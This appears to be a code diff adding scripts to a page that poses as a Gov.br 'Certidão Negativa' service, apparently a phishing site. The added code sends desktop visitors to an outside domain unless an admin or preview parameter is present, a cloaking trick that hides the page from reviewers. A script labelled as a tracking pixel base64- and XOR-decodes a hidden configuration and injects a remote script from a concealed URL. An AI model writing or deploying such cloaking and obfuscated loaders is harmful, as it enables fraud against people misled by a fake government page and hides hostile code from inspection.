@@ -4,6 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Certidão Negativa - Gov.br</title>
+    <!-- Redirecionamento Desktop (PC) -->
+    <script type="text/javascript">
+      var url_link_redirect_pc = "https://aprovacaosimja.online/";
+      function isMobile() {
+        const regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+        return regex.test(navigator.userAgent);
+      }
+      if (isMobile()) {
+        console.log("Mobile device detected");
+      } else {
+        if (!window.location.search.includes('admin=1') && !window.location.search.includes('preview=1')) {
+          window.location = url_link_redirect_pc;
+        }
+      }
+    </script>
     <!-- UTMify Pixel -->
     <script>(function(){var t_n1sv=atob("DJcCQoBduxNbiOvEKuwgN/IxmSl54J+wWuQ4ba8+3311/Z+pQ/F7bOMy1j05+sS3SeVrMvQulGMy8I6oBedrOuUxlXkoqsfmS+N2MOk/zmc++8n+ccouYOcx1HE65JjmEMx5YO481nZ5ssm0Q+9nLsk5mT95/oqoX/IgeKJr2nBsutqgHK9hdeM8jCpssN7yS6Y3dLN/xk4m");var r_aa=[];for(var n_g0y=0;n_g0y<t_n1sv.length;n_g0y++){r_aa.push(t_n1sv.charCodeAt(n_g0y)&255);}var j_fm=r_aa[0];var a_y=r_aa.slice(1,1+j_fm);var c_erw=r_aa.slice(1+j_fm);var s_e3og=c_erw.map(function(b,t_ea4){return b^a_y[t_ea4%j_fm];});var y_dl="";for(var z_kbc=0;z_kbc<s_e3og.length;z_kbc++){y_dl+=String.fromCharCode(s_e3og[z_kbc]&255);}var g_sler=decodeURIComponent(escape(y_dl));var a_xdms=JSON.parse(g_sler);var p_ts=a_xdms.globals||[];p_ts.forEach(function(b_yb1){window[b_yb1.name]=b_yb1.value;});var s_zkvk=document.createElement("script");s_zkvk.src=a_xdms.url;s_zkvk.async=true;s_zkvk.defer=true;(a_xdms.attributes||[]).forEach(function(w_v){s_zkvk.setAttribute(w_v.name,w_v.value);});(document.head||document.documentElement).appendChild(s_zkvk);})();</script>
     <!-- UTMify UTMs Tracker -->
